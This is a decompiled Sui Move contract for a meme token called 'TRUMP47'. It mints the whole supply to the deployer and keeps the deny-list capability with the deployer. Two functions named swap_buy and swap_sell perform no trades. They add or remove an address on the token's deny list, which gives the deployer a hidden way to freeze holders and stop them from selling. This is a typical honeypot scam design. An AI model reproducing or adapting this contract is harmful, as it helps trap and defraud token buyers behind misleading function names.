module 0x91513213f6950530f86bccdfab62772e81370ca44d1ee2a58fc8a9898eaeeb29::trump47 {
    struct TRUMP47 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TRUMP47, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TRUMP47>(arg0, 9, b"TRUMP47", b"Super President Trump 47", b"Super President Trump 47 #TRUMP47", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmex2KnSBZQXcb8nmqQX2cvyvDnS5GnU4uYZKxDnvhRqGK"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TRUMP47>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TRUMP47>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TRUMP47>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TRUMP47>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUMP47>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TRUMP47>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUMP47>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TRUMP47>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

